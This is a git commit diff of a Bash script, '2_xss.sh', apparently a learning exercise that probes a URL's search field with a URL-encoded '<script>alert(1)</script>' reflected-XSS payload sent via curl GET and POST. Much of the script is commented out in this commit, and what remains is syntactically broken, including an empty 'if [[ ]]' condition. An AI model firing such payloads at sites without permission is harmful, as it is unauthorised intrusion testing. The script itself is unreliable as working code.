7d5670aa66ba20b8142c2499695b75127b6963e0
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-04-25 16:30:33 +0200

    Update 2_xss.sh

--- 2_xss.sh
+++ 2_xss.sh
@@ -1,8 +1,4 @@
-
-
-search=$(wget -q -O - "$1" | grep "search")
-comment=$(wget -q -O - "$1" | grep "comment")
-if  [[ curl $URL | grep 'method=\"GET\"' ]]
+if  [[  ]]
 then
   #aqui ejecutamos xss con get, checkear si esta search
   if [[ $search ]]
@@ -10,29 +6,23 @@ then
     XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
     ATTACK="$URL$XSS"
     curl -i $ATTACK | grep "200 OK"
-else
-  if  [[ curl $URL | grep 'method=\"POST\"' ]]
-  then
+#  else
+ # if  [[ curl $URL | grep 'method=\"POST\"' ]]
+#  then
   #aqui ejecutamos xss con post, checkear si tambien esta comment
-    if [[ $comment ]]
-    then
-    
-    else
-      if [[ $search ]]
-      then
-        curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
-    fi
-  else
-  # aqui ejecutamos los  dos, checkear si esta search o comment
-    if [[ $comment ]]
-    then
-    
-    else [[ $search ]]
-      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-      ATTACK="$URL$XSS"
-      curl -i $ATTACK | grep "200 OK"
-      curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
-    fi
-      
+  #  if [[ $comment ]]
+ #   then
+ #    
+#    else
+    #  if [[ $search ]]
+   #   then
+  #      curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
+ #     fi
+#    fi
+ #   if [[ $search ]]
+#      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+#      ATTACK="$URL$XSS"
+#      curl -i $ATTACK | grep "200 OK"
+    fi      
   fi
 fi
